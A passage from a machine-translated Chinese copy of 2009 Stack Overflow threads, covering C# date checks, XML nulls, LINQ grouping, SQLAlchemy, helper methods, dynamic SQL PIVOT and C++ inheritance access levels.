
* * *

## 回答 #7

> 赞同：0
> 
> 时间：2009-05-13T20:56:51.450

如有必要，交换 t1 和 t2 以使 t1 <= t2

```
if(t1.AddYears(1) >= t2) {
    // t1 is within a year of t2
    return true;
} else {
    // t1 is not within a year of t2
    return false;
} 
```

* * *

## 回答 #8

> 赞同：-2
> 
> 时间：2009-05-13T20:41:35.797

```
if (year(date1) == year(date2))
{
   //true
}
else
{
   //false
} 
```

# xml - 从 REST API 响应序列化空值

> ID：860303
> 
> 赞同：0
> 
> 时间：2009-05-13T20:41:09.043
> 
> 标签：xml, serialization

我最近使用 WCF 来使用 REST API。我使用实体类来序列化 REST XML 响应，这是我遇到问题的部分：

```
<grid-cell-size type="decimal" nil="true"/> 
```

在我的 C# 类中：

```
[XmlElement("grid-cell-size")]
public decimal? GridCellSize { get; set; } 
```

但结果是**输入字符串的格式不正确。**错误信息。

如何更改我的 C# 代码以接受来自 XML 的空值？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2010-07-05T13:10:14.270

尝试添加“xsi”前缀：而不是

```
<grid-cell-size type="decimal" nil="true"/> 
```

利用

```
<grid-cell-size xsi:type="decimal" xsi:nil="true"/> 
```

当然 - 不要忘记将命名空间添加到主节点：xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3\. org/2001/XMLSchema"

命名空间声明（如果尚未声明）

# c# - 如何使用 Linq 对每 N 行进行分组

> ID：860305
> 
> 赞同：24
> 
> 时间：2009-05-13T20:41:13.363
> 
> 标签：c#, linq, group-by

我找不到一种方法来完成这项工作，并希望有人有一个想法。一个简化的例子是有一个整数 1-100 的列表，我想每 3 行分组一次，所以结果将是第一组中的 1,2,3，然后是下一组中的 4,5,6，等等。我知道如何获取每第 n 条记录，但我需要的是所有记录，因此我可以使用 first、last、sum、max 等来聚合它们。

谢谢！

* * *

## 回答 #1

> 赞同：42
> 
> 时间：2009-05-13T20:58:39.717

此示例适用于查询非数字集合。它将索引投影到要分组的对象中，然后在分组期间再次将其删除。

```
var studentQuery2 = students
    .Select((student, index) => new {student, index})
    .GroupBy(g => g.index / 3, i => i.student); 
```

* * *

## 回答 #2

> 赞同：31
> 
> 时间：2009-05-13T20:53:04.313

```
var q = Enumerable.Range(0, 100).GroupBy(x => x/3); 
```

我错过了什么吗？

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2017-04-07T14:09:47.943

一个更简单的方法怎么样：

```
var index = 0;
var grpOf3s = students.GroupBy(x => index++ / 3); 
```

**更新：** 如果您使用`Key`组项的值，则需要将组可枚举转换为列表。`Key`否则每次访问都会得到不同的结果。

```
var index = 0;
var grpOf3s = students.GroupBy(x => index++ / 3).ToList(); 
```

# python - SQLAlchemy 很复杂？

> ID：860313
> 
> 赞同：36
> 
> 时间：2009-05-13T20:42:33.113
> 
> 标签：python, orm, sqlalchemy

这似乎很有争议，但我刚刚浏览了 SQLAlchemy 的[ORM 教程](http://www.sqlalchemy.org/docs/05/ormtutorial.html)并最终得到以下代码：

```
from sqlalchemy import create_engine
from sqlalchemy import Table, Column, Integer, String, MetaData, ForeignKey
from sqlalchemy.ext.declarative import declarative_base
from sqlalchemy.orm import sessionmaker

engine = create_engine('sqlite:///:memory:', echo=True)

metadata = MetaData()
users_table = Table('users', metadata,
    Column('id', Integer, primary_key=True),
    Column('name', String),
    Column('fullname', String),
    Column('password', String)
)

metadata.create_all(engine)

Base = declarative_base()
class User(Base):
    __tablename__ = 'users'

    id = Column(Integer, primary_key=True)
    name = Column(String)
    fullname = Column(String)
    password = Column(String)

    def __init__(self, name, fullname, password):
        self.name = name
        self.fullname = fullname
        self.password = password

    def __repr__(self):
       return "<User('%s','%s', '%s')>" % (self.name, self.fullname, self.password)

users_table = User.__table__
metadata = Base.metadata

Session = sessionmaker(bind=engine)
Session = sessionmaker()
Session.configure(bind=engine)  # once engine is available
session = Session()

# actually using the ORM isn't too bad..
ed_user = User('ed', 'Ed Jones', 'edspassword')
session.add(ed_user)

our_user = session.query(User).filter_by(name='ed').first() 
print our_user

session.add_all([
    User('wendy', 'Wendy Williams', 'foobar'),
    User('mary', 'Mary Contrary', 'xxg527'),
    User('fred', 'Fred Flinstone', 'blah')])

ed_user.password = 'f8s7ccs'

print session.dirty
print session.new
session.commit()

for instance in session.query(User).order_by(User.id): 
    print instance.name, instance.fullname

for name, fullname in session.query(User.name, User.fullname): 
    print name, fullname 
```

对于有效的 Hello World 表来说，这似乎非常复杂，尤其是与大致相似的 SQLObject 代码相比：

```
from sqlobject import SQLObject, StringCol, sqlhub, connectionForURI

sqlhub.processConnection = connectionForURI('sqlite:/:memory:')

class Person(SQLObject):
    fname = StringCol()
    mi = StringCol(length=1, default=None)
    lname = StringCol()

Person.createTable()

p = Person(fname="John", lname="Doe")
p.mi = 'Q'
p2 = Person.get(1)
print p2
print p2 is p 
```

我知道 SQLAlchemy “更强大”，但这种能力似乎是有代价的，还是我错过了什么？

* * *

## 回答 #1

> 赞同：88
> 
> 时间：2009-05-13T21:52:41.983

好吧，您缺少一件事：您提到的教程并没有“构建”一个完整的示例，不同的代码片段并不意味着要连接到一个源文件中。相反，它们描述了可以使用该库的不同方式。无需自己一遍又一遍地尝试做同样的事情。

从您的示例中省略实际使用的orm部分，代码可能如下所示：

```
from sqlalchemy import *
from sqlalchemy.ext.declarative import declarative_base
from sqlalchemy.orm import sessionmaker, scoped_session

engine = create_engine('sqlite:///:memory:', echo=True)
Base = declarative_base(bind=engine)
Session = scoped_session(sessionmaker(engine))

class User(Base):
    __tablename__ = 'users'

    id = Column(Integer, primary_key=True)
    name = Column(String)
    fullname = Column(String)
    password = Column(String)

Base.metadata.create_all() 
```

“声明性”扩展负责定义表并将其映射到您的类，因此您不需要`users_table`自己声明。User 类还将允许使用关键字参数进行实例化，例如`User(name="foo")`,（但不是位置参数）。我还添加了对 scoped_session 的使用，这意味着您可以直接使用`Session`而无需实际实例化它（如果当前线程中还没有会话，它将实例化一个新会话，否则重用现有会话）

* * *

## 回答 #2

> 赞同：10
> 
> 时间：2009-05-13T21:53:11.920

您提供的代码示例不是苹果对苹果。SQLAlchemy 版本可以减少一点：

```
from sqlalchemy import create_engine
from sqlalchemy import Table, Column, Integer, String, MetaData, ForeignKey
from sqlalchemy.ext.declarative import declarative_base
from sqlalchemy.orm import sessionmaker

engine = create_engine('sqlite:///:memory:', echo=True)
Base = declarative_base()

class User(Base):
    __tablename__ = 'users'

    id = Column('id', Integer, primary_key=True)
    name = Column('name', String)
    fullname = Column('fullname', String)
    password = Column('password', String)

    def __repr__(self):
       return "" % (self.name, self.fullname, self.password)

Base.metadata.create_all(engine)

Session = sessionmaker(bind=engine)
session = Session()

# actually using the ORM isn't too bad..
ed_user = User(name='ed', fullname='Ed Jones', password='edspassword')
session.add(ed_user)

our_user = session.query(User).filter_by(name='ed').first()

session.add_all([
    User(name='wendy', fullname='Wendy Williams', password='foobar'),
    User(name='mary', fullname='Mary Contrary', password='xxg527'),
    User(name='fred', fullname='Fred Flinstone', password='blah')])

ed_user.password = 'f8s7ccs'

session.flush()

for instance in session.query(User).order_by(User.id):
    print instance.name, instance.fullname

for name, fullname in session.query(User.name, User.fullname):
    print name, fullname 
```

您可能还会发现[Elixir](http://elixir.ematia.de/trac/wiki)更像 SQLObject（但由于我没有使用过任何一种，这只是一个猜测）。

根本没有使用过 SQLObject，我无法评论 SA 究竟在哪些方面做得更好。但我在 SA 方面拥有丰富的经验，尤其是在处理复杂的、现实世界的遗留模式时。默认情况下，它很好地提出了良好的 SQL 查询，并且有很多方法可以调整它们。

我发现 SQLAlchemy 作者的[电梯间距](http://techspot.zzzeek.org/?p=33)在实践中表现得很好。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-05-13T21:05:04.620

好吧，SQLAlchemy 分为不同的部分，主要核心部分只是处理数据库，将您的 python 构建查询转换为底层数据库的适当 SQL 语言。然后是对会话、orm 和新的声明性语法的支持。

看起来 SQLObject （我不能肯定地说，已经很多年没有使用它了，即使那样，也只有一次）跳过了大部分并立即执行 ORM 部分。这通常使简单数据的事情变得更容易（在大多数情况下你可以逃脱），但 SQLAlchemy 允许更复杂的数据库布局，如果你真的需要它，可以使用数据库。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2009-05-13T22:04:53.383

使用过 SQLObject（并且只阅读过 SQLAlchemy），我可以说 SQLObject 的优势之一是您可以轻松简单地完成工作。此外，电子邮件组 ( [https://lists.sourceforge.net/lists/listinfo/sqlobject-discuss](https://lists.sourceforge.net/lists/listinfo/sqlobject-discuss) ) 提供了出色的支持，可以很快地回复您。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2011-11-11T18:53:42.600

试试[Quick ORM](http://pypi.python.org/pypi/quick_orm)，它更简单：

```
from quick_orm.core import Database
from sqlalchemy import Column, String

class User(object):
    __metaclass__ = Database.DefaultMeta
    name = Column(String(30))

if __name__ == '__main__':
    database = Database('sqlite://')
    database.create_tables()

    user = User(name = 'Hello World')
    database.session.add_then_commit(user)

    user = database.session.query(User).get(1)
    print 'My name is', user.name 
```

[Quick ORM](http://pypi.python.org/pypi/quick_orm)建立在 SQLAlchemy 之上，因此我们可以说 SQLAlchemy 可以像 SQLObject 一样简单。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2009-05-13T20:58:36.487

您说“令人费解”....其他人可能会说“灵活”。有时你需要它，有时你不需要。你有选择权不是很棒吗？

# objective-c - 您认为什么被称为“辅助方法”？

> ID：860326
> 
> 赞同：3
> 
> 时间：2009-05-13T20:44:51.487
> 
> 标签：objective-c, oop

我想知道什么样的方法是“辅助方法”。我们必须在哪里画边界才能说特定方法是“辅助方法”？实际上，如果任何方法不是初始化方法、为符合协议或委托响应方法而实现的方法，我认为任何方法都是“辅助方法”。在我看来，我为执行任何操作而实施的任何其他方法都是“辅助方法”，但我觉得还有更多类别需要考虑。

为什么我要知道这个？因为我想在 Xcode 中使用 #pragma mark HEADLINE 东西。我相信以某种方式组织代码是件好事。

请帮助我清楚地了解“辅助方法”。例子赞赏！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2009-05-13T20:50:43.427

我将其视为库正常运行不需要的方法，但使最终用户更容易或更易读。

嗯……没有举例。假设您有一个从数据库中获取用户的功能，它采用以下形式

```
User GetUsers(UserRole)
{
//Do Something
} 
```

示例辅助方法可能是

```
User GetAdmins()
{
   return GetUsers("Admins");
} 
```

它是一个粗略的伪代码类型示例，但为您提供了要点。GetAdmins 的功能在 GetUsers() 中是完整的，但 GetAdmins 辅助函数有助于提高可读性（仅此而已）。

说得通？

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-05-13T21:31:31.317

On Objective-C, I think you could call any private method a "helper method", where by private I mean that the method signature doesn't appear in the .h file. I.e. these are methods you'd likely declare in a class continuation in the .m file:

```
@interface MyClass ()
- (void)somePrivateMethod;
@end 
```

What some other answers are calling helper methods -- optional but public methods that are not crucial to the API -- I would rather call "convenience methods".

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-05-13T20:56:31.967

我想说一个特定于特定类但不依赖于访问该类的私有实现细节的方法是该类的辅助方法。辅助方法也不应该是有状态的。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2009-05-13T20:58:00.827

我认为辅助方法是只有一个调用者的方法。它*可以*被内联，但由于它的代码在调用者外部，调用者更容易理解，固有的复杂性更少。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2009-05-13T20:58:10.827

我认为您的问题取决于上下文。一般来说，您可以说，正如您所说，每种方法都可以是某些应用程序中的辅助方法。但我相信在大多数情况下，辅助方法更多是将一些通用方法分成几个更小的方法，以提供更清晰的图片和更好的代码。

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2009-05-13T20:58:44.240

通常，我将帮助方法定义为使类更易于使用的方法，但不提供无法通过调用其他更复杂的方法来实现的新行为。

例子：

*   `+[NSObject new]`是一个辅助方法`[[NSObject alloc] init];`
*   `NSClassFromString(str)`是一个辅助方法`objc_getClass([str UTF8String]);`
*   `+[NSURL URLWithString:str]`是一个辅助方法`[[[NSURL alloc] initWithString:str] autorelease];`
*   `-[NSURLRequest initWithRequest:request delegate:delegate]`是一个辅助方法`[request initWithRequest:request delegate:delegate startImmediately:NO]`
*   `-[NSString substringFromIndex:]`是一个辅助方法`-[NSString substringWithRange:]`

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2009-05-13T21:05:42.747

我会加入一些提供一些通用实用程序的东西，而不是围绕更复杂的功能或与实现细节有关的东西。例如，对我来说，一个辅助方法类似于 NSString 上的一个方法，它直接返回一个 NSDate，而不是要求你到处使用 NSDateFormatters。

在这方面，我将帮助方法分类为通过将一些常用序列包装到单个函数中来帮助您干燥代码的东西，或者您编写的用于包装来自另一个 API 的一些笨拙代码的东西（是的，这两个通常是同一件事）。

冒着看起来像是试图在这里拉皮条我自己的代码的风险，我将指向[我的工具包存储库](http://github.com/AlanQuatermain/aqtoolkit/tree/master)的 Extensions 目录，其中包含我在标准 Objective-C 上作为“辅助方法”编写的一大堆东西类。举个例子：`+(NSError *)errorWithCFStreamError:(CFStreamError)streamError`，这是一个“辅助方法”，用于使用在 OS X 10.5（和 iPhone）中导出的新值将旧式 CFStreamError 值转换为正确的 NSError/CFErrorRef 对象。

# c# - ComponentArt Grid OnKeyPress 重置

> ID：860331
> 
> 赞同：0
> 
> 时间：2009-05-13T20:45:24.763
> 
> 标签：c#, grid, onkeypress, componentart

有没有办法通过代码（C#）重置按键搜索值和状态？

ComponentArt (CA) 网格用于从数据库中选择要更新的记录。更新过程完成后，我需要重置搜索状态。

由于某种原因，在重新绑定 CA 网格后，按键搜索/过滤器仍然存在。我必须手动从搜索框中删除/删除文本才能通过 CA 网格访问整个记录。

谢谢你。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2009-06-17T08:49:06.747

在 JavaScript 中，我使用**了 MyGrid.Search('');** ，所以我想这也可能在 C# 代码中可用。

# tsql - 如何在 SQL Server 2008 函数中动态生成表列定义

> ID：860336
> 
> 赞同：0
> 
> 时间：2009-05-13T20:46:29.690
> 
> 标签：tsql, sql-server-2008, stored-procedures, dynamic-sql

在 SQL Server 2008 中我有一种情况，我需要返回一个动态生成的表，并且列也是动态生成的。

这一切都是由查询生成的，因为我从一个 id 开始，然后我得到列名和类型，这就是强制转换的原因。

以下是最终查询，在一种情况下将返回我想要的表，但这个类似的查询可用于返回多个表。

这目前在 C# 中实现，但我希望它应该在存储过程或函数中可行，但是，我不确定如何进行多个查询来构建此查询，然后返回表。

谢谢你。

```
SELECT ResultID, ResultName, ResultDescription, 
CAST([233] AS Real) as [ResultColA], 
CAST([234] AS Int) as [ResultColB], 
CAST([236] AS NVarChar) as [ResultColC], 
CAST([237] AS Int) as [ResultColD]
FROM (
    SELECT st.*, avt.ResultID as avtID, avt.SomeAttrID, avt.Value 
    FROM Result_AV avt 
    JOIN Result st ON avt.ResultID = st.ResultID) as p 
    PIVOT ( 
        MAX(Value) FOR AttributeID IN ([233], [234], [236], [237])) as pvt 
```

更新：如果我有一张包含汽车制造商的表格，并且我想要通用汽车制造的汽车的所有属性。我会查找汽车的信息，用它来获取所有汽车制造商，这将是通用汽车，然后我想获取通用汽车制造的所有汽车的信息，但是，由于信息是动态生成的列是不同的。那就是我所在的地方，需要动态生成这个表。我很好奇我是否可以调用 Web 服务，获取动态生成的查询，然后让存储过程或函数执行该查询。

更新 2：获得此表后的下一步是，我需要将汽车上的所有选项（在这种情况下）相加，以确定汽车的实际价格。这就是为什么它需要采用表格格式。此时，我正在查看 GM 制造的汽车，但我可以对 SeaRay 制造的船只进行另一个查询，即使船上的表列与汽车不同，查询也应该工作相同。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2009-05-15T16:19:58.817

您可以使用动态 SQL 执行此操作。您需要使用查询和/或元数据适当地构建两个列表，然后将它们插入 SQL：

```
DECLARE @template AS varchar(MAX)

SET @template = '
SELECT ResultID, ResultName, ResultDescription
{@SELECT_COLUMN_LIST}
FROM (
    SELECT st.*, avt.ResultID as avtID, avt.SomeAttrID, avt.Value 
    FROM Result_AV avt 
    JOIN Result st ON avt.ResultID = st.ResultID) as p 
    PIVOT ( 
        MAX(Value) FOR AttributeID IN ({@PIVOT_COLUMN_LIST})) as pvt'

DECLARE @sql AS varchar(MAX)

SET @sql = REPLACE(REPLACE(@template, '{@SELECT_COLUMN_LIST}', @SELECT_COLUMN_LIST), '{@PIVOT_COLUMN_LIST}', @PIVOT_COLUMN_LIST)

EXEC (@sql) 
```

要填充`@SELECT_COLUMN_LIST`and `@PIVOT_COLUMN_LIST`，您有几个选项，但这样的事情避免了对游标或尴尬的字符串操作的任何需要：

```
SELECT @PIVOT_COLUMN_LIST = COALESCE(@PIVOT_COLUMN_LIST, '') + ',' + QUOTENAME(value)
FROM (SELECT DISTINCT value FROM table) 
```

显然，`@SELECT_COLUMN_LIST`您需要将此信息与一些元数据结合起来。

为了便于维护，我做了类似的事情，因为 PIVOT 和 UNPIVOT 不允许列表成为动态 SQL（因为它们会导致输出表上的模式更改）。对于不解释列的客户端报告样式或列表框使用，这无关紧要。

# c++ - 私有继承、公有继承和受保护继承之间的区别

> ID：860339
> 
> 赞同：1143
> 
> 时间：2009-05-13T20:47:07.410
> 
> 标签：c++, inheritance, encapsulation, access-specifier, c++-faq

> **C++**`public`中的、`private`和`protected`继承 有什么区别？

 **我在 SO 上发现的所有问题都涉及特定案例。

* * *

## 回答 #1

> 赞同：1623
> 
> 时间：2009-09-03T11:27:56.297

```
class A 
{
    public:
       int x;
    protected:
       int y;
    private:
       int z;
};

class B : public A
{
    // x is public
    // y is protected
    // z is not accessible from B
};

class C : protected A
{
    // x is protected
    // y is protected
    // z is not accessible from C
};

class D : private A    // 'private' is default for classes
{
    // x is private
    // y is private
    // z is not accessible from D
}; 
```

重要提示：B、C 和 D 类都包含变量 x、y 和 z。这只是访问的问题。

关于受保护和私有继承的使用，您可以[在此处](https://stackoverflow.com/questions/374399/private-protected-inheritance/374423)阅读。

* * *

## 回答 #2

> 赞同：1156
> 
> 时间：2009-05-13T20:49:37.733

为了回答这个问题，我想先用我自己的话来描述一下成员的访问者。如果您已经知道这一点，请跳到标题“下一个：”。

我知道三个访问器`public`：`protected`和`private`。

让：

```
class Base {
    public:
        int publicMember;
    protected:
        int protectedMember;
    private:
        int privateMember;
}; 
```

*   觉知的一切`Base`也觉知`Base`包含`publicMember`。
*   只有孩子（和他们的孩子）知道`Base`包含`protectedMember`.
*   没有人`Base`知道`privateMember`。

“知道”，我的意思是“承认存在，因此能够访问”。

## 下一个：

公共、私有和受保护的继承也是如此。让我们考虑一个类`Base`和一个`Child`继承自`Base`.

*   如果继承是`public`，所有知道`Base`并且`Child`也知道`Child`继承自的东西`Base`。
*   如果继承是`protected`，只有`Child`及其子级知道它们继承自`Base`。
*   如果继承是`private`，那么没有人`Child`知道继承。

* * *

## 回答 #3

> 赞同：123
> 
> 时间：2009-09-03T16:04:21.027

限制继承的可见性将使代码无法看到某个类继承了另一个类：从派生到基的隐式转换不起作用，`static_cast`从基到派生的隐式转换也不起作用。

只有类的成员/朋友才能看到私有继承，只有成员/朋友和派生类才能看到受保护的继承。

**公共**继承

1.  IS-A 继承。一个按钮就是一个窗口，在任何需要窗口的地方，也可以传递一个按钮。

    ```
    class button : public window { }; 
    ```

**受保护**的继承

1.  受保护的实施条款。很少有用。用于`boost::compressed_pair`从空类派生并使用空基类优化节省内存（下面的示例不使用模板来保持这一点）：

    ```
    struct empty_pair_impl : protected empty_class_1 
    { non_empty_class_2 second; };

    struct pair : private empty_pair_impl {
      non_empty_class_2 &second() {
        return this->second;
      }

      empty_class_1 &first() {
        return *this; // notice we return *this!
      }
    }; 
    ```

**私有**继承

1.  按条款实施。基类的使用仅用于实现派生类。对特征有用，如果大小很重要（只包含函数的空特征将利用空基类优化）。不过，通常*遏制*是更好的解决方案。字符串的大小很关键，所以这里经常用到

    ```
    template<typename StorageModel>
    struct string : private StorageModel {
    public:
      void realloc() {
        // uses inherited function
        StorageModel::realloc();
      }
    }; 
    ```

* * *

**公共**成员

1.  总计的

    ```
    class pair {
    public:
      First first;
      Second second;
    }; 
    ```

2.  访问器

    ```
    class window {
    public:
        int getWidth() const;
    }; 
    ```

**受保护**成员

1.  为派生类提供增强的访问权限

    ```
    class stack {
    protected:
      vector<element> c;
    };

    class window {
    protected:
      void registerClass(window_descriptor w);
    }; 
    ```

**私人**会员

1.  保留实施细节

    ```
    class window {
    private:
      int width;
    }; 
    ```

* * *

请注意，C 风格的强制转换故意允许以定义和安全的方式将派生类强制转换为受保护或私有基类，也可以强制转换为另一个方向。应该不惜一切代价避免这种情况，因为它会使代码依赖于实现细节——但如果有必要，您可以利用这种技术。

* * *

## 回答 #4

> 赞同：84
> 
> 时间：2015-06-07T16:56:41.690

这三个关键字也用在完全不同的上下文中来指定**可见性继承模型**。

该表收集了组件声明和继承模型的所有可能组合，展示了子类完全定义后对组件的访问。

![在此处输入图像描述](https://i.stack.imgur.com/W6CJ3.jpg)

上表解释如下（看第一行）：

> *如果一个组件被**声明**为**public**并且它的类被**继承**为**public**，则结果**访问**是**public**。*

一个例子：

```
 class Super {
    public:      int p;
    private:     int q;
    protected:   int r;
 };

 class Sub : private Super {};

 class Subsub : public Sub {}; 
```

**对Subsub**类中的变量`p`,`q`的结果访问是**none**。`r`

 ****> 另一个例子：

```
class Super {
    private:     int x;
    protected:   int y;
    public:      int z;
 };
class Sub : protected Super {}; 
```

对变量的结果访问`y`，`z`在类**Sub**中是**受保护**的，而对变量的访问`x`是**无**的。

> 一个更详细的例子：

```
class Super {
private:
    int storage;
public:
    void put(int val) { storage = val;  }
    int  get(void)    { return storage; }
};
int main(void) {
    Super object;

    object.put(100);
    object.put(object.get());
    cout << object.get() << endl;
    return 0;
} 
```

现在让我们定义一个子类：

```
class Sub : Super { };

int main(void) {
    Sub object;

    object.put(100);
    object.put(object.get());
    cout << object.get() << endl;
    return 0;
} 
```

已定义的名为 Sub 的类是名为的类的子类，`Super`或者`Sub`该类是从`Super`该类派生的。该类`Sub`既不引入新变量也不引入新函数。这是否意味着该类的任何对象都`Sub`继承了`Super`该类实际上是`Super`类对象的副本之后的所有特征？

**没有**。它没有。

如果我们编译以下代码，我们只会得到编译错误，指出`put`方法`get`不可访问。为什么？

当我们省略可见性说明符时，编译器假定我们将应用所谓的**私有继承**。这意味着所有**公共**超类组件都变成**私有**访问，私有超类组件根本无法访问。因此，这意味着您不允许在子类中使用后者。

我们必须通知编译器我们要保留以前使用的访问策略。

```
class Sub : public Super { }; 
```

> *不要被误导*：这并不意味着 Super 类的私有组件（如存储变量）将以某种神奇的方式变成公共组件。**私有**组件将保持**私有**，**公共** 将保持**公开**。

类的对象可以做“几乎”与从类中`Sub`创建的兄弟姐妹一样的事情。*“几乎”*是因为作为子类的事实也意味着**该类无法访问超类的私有组件**。我们不能编写能够直接操作存储变量的类的成员函数。`Super`***`Sub`***

 ***这是一个非常严重的限制。有什么解决方法吗？

**是**的。

第三个访问级别称为**protected**。关键字 protected 意味着用它标记的组件**在被任何子类使用时表现得像一个公共组件，而对于世界其他地方来说，它看起来像一个私有**组件。--*这仅适用于公共继承的类（如我们示例中的 Super 类）* --

```
class Super {
protected:
    int storage;
public:
    void put(int val) { storage = val;  }
    int  get(void)    { return storage; }
};

class Sub : public Super {
public:
    void print(void) {cout << "storage = " << storage;}
};

int main(void) {
    Sub object;

    object.put(100);
    object.put(object.get() + 1);
    object.print();
    return 0;
} 
```

正如您在示例代码中看到的，我们为`Sub`该类提供了一项新功能，它做了一件重要的事情：**它从 Super 类访问存储变量**。

如果变量被声明为私有，这是不可能的。在主函数范围内，变量仍然是隐藏的，所以如果你写如下：

```
object.storage = 0; 
```

编译器会通知您它是一个`error: 'int Super::storage' is protected`.

最后，最后一个程序将产生以下输出：

```
storage = 101 
```

* * *

## 回答 #5

> 赞同：69
> 
> 时间：2009-05-13T20:49:19.607

它与基类的公共成员如何从派生类公开有关。

*   public -> 基类的公共成员将是公共的（通常是默认的）
*   protected -> 基类的公共成员将受到保护
*   private -> 基类的公共成员将是私有的

正如 litb 所指出的，公共继承是您将在大多数编程语言中看到的传统继承。也就是说，它模拟了“IS-A”关系。私有继承是 C++ 特有的 AFAIK，是一种“在条款中实现”的关系。那就是您想在派生类中**使用**公共接口，但不希望派生类的用户有权访问该接口。许多人认为，在这种情况下，您应该聚合基类，而不是将基类作为私有基类，而是在派生的成员中创建，以便重用基类的功能。

* * *

## 回答 #6

> 赞同：37
> 
> 时间：2010-09-09T05:25:38.283

```
Member in base class : Private   Protected   Public 
```

**继承类型** ：             **对象继承为**：

```
Private            :   Inaccessible   Private     Private   
Protected          :   Inaccessible   Protected   Protected  
Public             :   Inaccessible   Protected   Public 
```

* * *

## 回答 #7

> 赞同：28
> 
> 时间：2016-05-26T04:42:05.147

**1）公共继承**：

一种。在派生类中无法访问基类的私有成员。

湾。Base 类的受保护成员在 Derived 类中保持受保护。

C。Base 类的公共成员在 Derived 类中仍然是公共的。

因此，其他类可以通过派生类对象使用基类的公共成员。

**2）受保护的继承**：

一种。在派生类中无法访问基类的私有成员。

湾。Base 类的受保护成员在 Derived 类中保持受保护。

C。Base 类的公共成员也成为 Derived 类的受保护成员。

所以，其他类不能通过派生类对象使用基类的公共成员；但它们可用于 Derived 的子类。

**3）私人继承**：

一种。在派生类中无法访问基类的私有成员。

湾。基类的受保护和公共成员成为派生类的私有成员。

因此，其他类不能通过派生类对象访问基类的任何成员，因为它们在派生类中是私有的。因此，即使派生类的子类也无法访问它们。

* * *

## 回答 #8

> 赞同：20
> 
> 时间：2009-09-03T12:34:26.367

公共继承对 IS-A 关系建模。和

```
class B {};
class D : public B {}; 
```

每一个`D` *都是一个* `B`。

私有继承对 IS-IMPLEMENTED-USING 关系（或任何所谓的）建模。和

```
class B {};
class D : private B {}; 
```

a`D`不是a ，但每个都*在*其实现中使用它。私有继承总是可以通过使用包含来消除：`B``D``B`

```
class B {};
class D {
  private: 
    B b_;
}; 
```

这`D`也可以使用 来实现`B`，在这种情况下使用它的`b_`. 与继承相比，包含在类型之间的耦合不那么紧密，因此通常应该首选它。有时使用包含而不是私有继承不如私有继承方便。这通常是懒惰的一个蹩脚的借口。

我认为没有人知道`protected`继承模型是什么。至少我还没有看到任何令人信服的解释。

* * *

## 回答 #9

> 赞同：10
> 
> 时间：2009-09-03T11:27:55.203

如果您从另一个类公开继承，那么每个人都知道您正在继承，并且任何人都可以通过基类指针多态地使用您。

如果您受保护地继承，则只有您的子类才能多态地使用您。

如果你私有继承，只有你自己能够执行父类方法。

这基本上象征着其他班级对您与父班级的关系的了解

* * *

## 回答 #10

> 赞同：10
> 
> 时间：2015-05-09T23:03:59.067

```
Accessors    | Base Class | Derived Class | World
—————————————+————————————+———————————————+———————
public       |      y     |       y       |   y
—————————————+————————————+———————————————+———————
protected    |      y     |       y       |   n
—————————————+————————————+———————————————+———————
private      |            |               |    
  or         |      y     |       n       |   n
no accessor  |            |               |

y: accessible
n: not accessible 
```

基于[this](https://stackoverflow.com/a/215505/1519058) example for java...我认为一张价值一千字的小桌子:)

* * *

## 回答 #11

> 赞同：9
> 
> 时间：2009-05-13T20:57:10.703

从您的类继承的任何类都可以访问受保护的数据成员。但是，私有数据成员不能。假设我们有以下内容：

```
class MyClass {
    private:
        int myPrivateMember;    // lol
    protected:
        int myProtectedMember;
}; 
```

在您对此类的扩展中，引用`this.myPrivateMember`将不起作用。不过，`this.myProtectedMember`会。该值仍然是封装的，所以如果我们有一个名为 的类的实例化`myObj`，那么`myObj.myProtectedMember`它将不起作用，因此它在功能上类似于私有数据成员。

* * *

## 回答 #12

> 赞同：7
> 
> 时间：2009-05-13T20:58:28.140

概括：

*   私人：除了班级内没有人可以看到它
*   受保护：私有+派生类可以看到
*   公众号：全世界都能看到

继承时，您可以（在某些语言中）在某个方向更改数据成员的保护类型，例如从受保护到公共。

* * *

## 回答 #13

> 赞同：7
> 
> 时间：2010-01-06T14:04:59.367

## 私人的：

基类的私有成员只能由该基类的成员访问。

## 上市：

基类的公共成员可以被该基类的成员、其派生类的成员以及基类和派生类之外的成员访问。

## 受保护：

基类的受保护成员可以由基类的成员及其派生类的成员访问。

* * *

## 简而言之：

**私人**：基地

**受保护**：基础+派生

**public** : 基础 + 派生 + 任何其他成员

* * *

## 回答 #14

> 赞同：6
> 
> 时间：2020-09-22T18:29:04.807

我尝试使用下面的图片来解释继承。

主要要点是父类的私有成员永远不能从派生/子类直接访问，但您可以使用父类的成员函数来访问父类的私有成员。私有变量始终存在于派生类中，但派生类无法访问它。就像他们的一样，但你不能用自己的眼睛看到，但如果你问家长班的某个人，那么他可以向你描述。 [![继承映射 cpp](https://i.stack.imgur.com/kRylZ.png)](https://i.stack.imgur.com/kRylZ.png)

* * *

## 回答 #15

> 赞同：4
> 
> 时间：2015-02-24T10:05:09.517

我找到了一个简单的答案，因此也想将其发布以供将来参考。

它来自链接[http://www.learncpp.com/cpp-tutorial/115-inheritance-and-access-specifiers/](http://www.learncpp.com/cpp-tutorial/115-inheritance-and-access-specifiers/)

```
class Base
{
public:
    int m_nPublic; // can be accessed by anybody
private:
    int m_nPrivate; // can only be accessed by Base member functions (but not derived classes)
protected:
    int m_nProtected; // can be accessed by Base member functions, or derived classes.
};

class Derived: public Base
{
public:
    Derived()
    {
        // Derived's access to Base members is not influenced by the type of inheritance used,
        // so the following is always true:

        m_nPublic = 1; // allowed: can access public base members from derived class
        m_nPrivate = 2; // not allowed: can not access private base members from derived class
        m_nProtected = 3; // allowed: can access protected base members from derived class
    }
};

int main()
{
    Base cBase;
    cBase.m_nPublic = 1; // allowed: can access public members from outside class
